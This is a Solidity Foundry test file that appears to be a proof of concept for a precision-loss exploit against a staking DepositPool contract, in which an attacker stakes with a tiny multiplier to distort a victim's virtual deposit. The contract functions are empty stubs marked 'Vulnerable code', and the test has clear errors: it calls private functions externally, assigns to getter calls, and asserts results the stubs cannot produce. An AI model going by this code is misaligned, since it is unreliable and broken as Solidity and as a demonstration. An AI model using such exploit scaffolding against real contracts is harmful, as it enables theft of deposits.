// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function rewardPool() external view returns (address);
    function withdraw(uint256 rewardPoolIndex, uint256 amount) external;
    function distributeRewards(uint256 rewardPoolIndex) external;
}

interface IRewardPool {
    function isRewardPoolPublic(uint256 rewardPoolIndex) external view returns (bool);
    function onlyExistedRewardPool(uint256 rewardPoolIndex) external view;
}

contract DepositPool {
    struct RewardPoolData {
        uint128 lastUpdate;
        uint256 rate;
        uint256 totalVirtualDeposited;
    }

    struct UserData {
        uint256 deposited;
        uint256 virtualDeposited;
        uint256 rate;
        uint128 lastStake;
        uint128 claimLockStart;
        uint128 claimLockEnd;
        address referrer;
        uint256 pendingRewards;
    }

    mapping(uint256 => RewardPoolData) public rewardPoolsData;
    mapping(address => mapping(uint256 => UserData)) public usersData;
    address public distributor;
    address public depositToken;
    bool public isMigrationOver;
    uint256 public totalDepositedInPublicPools;

    function _stake(address user_, uint256 rewardPoolIndex_, uint256 amount_, uint256 currentPoolRate_, uint256 claimLockEnd_, address referrer_) private {
        // Vulnerable code
    }

    function _withdraw(address user_, uint256 rewardPoolIndex_, uint256 amount_, uint256 currentPoolRate_) private {
        // Vulnerable code
    }

    function _claim(uint256 rewardPoolIndex_, address user_, address receiver_) private {
        // Vulnerable code
    }
}

contract ExploitTest is Test {
    DepositPool depositPool;
    address attacker = address(0x1);
    address victim = address(0x2);
    uint256 rewardPoolIndex = 0;
    uint256 initialDeposit = 1000 ether;
    uint256 smallMultiplier = 1; // Very small multiplier to cause precision loss
    uint256 PRECISION = 1e18;

    function setUp() public {
        // Deploy the DepositPool contract
        depositPool = new DepositPool();

        // Set up initial state
        vm.deal(attacker, 10 ether);
        vm.deal(victim, 10 ether);

        // Assume the distributor and depositToken are set
        depositPool.distributor() = address(this);
        depositPool.depositToken() = address(this);

        // Fund the victim's account with initial deposit
        deal(address(depositPool), victim, initialDeposit);
    }

    function test_exploit() public {
        // Step 1: Victim stakes with a normal multiplier
        vm.prank(victim);
        depositPool._stake(victim, rewardPoolIndex, initialDeposit, 1e18, block.timestamp + 1 days, address(0));

        // Step 2: Attacker manipulates the multiplier to be very small
        vm.prank(attacker);
        depositPool._stake(attacker, rewardPoolIndex, 0, smallMultiplier, block.timestamp + 1 days, address(0));

        // Step 3: Victim tries to withdraw, expecting full amount
        vm.prank(victim);
        depositPool._withdraw(victim, rewardPoolIndex, initialDeposit, 1e18);

        // Assert the vulnerability: Victim's virtual deposit is inaccurately calculated
        DepositPool.UserData memory userData = depositPool.usersData(victim, rewardPoolIndex);
        uint256 expectedVirtualDeposited = (initialDeposit * 1e18) / PRECISION;
        assertEq(userData.virtualDeposited, expectedVirtualDeposited, "Virtual deposit calculation is incorrect due to precision loss");
    }
}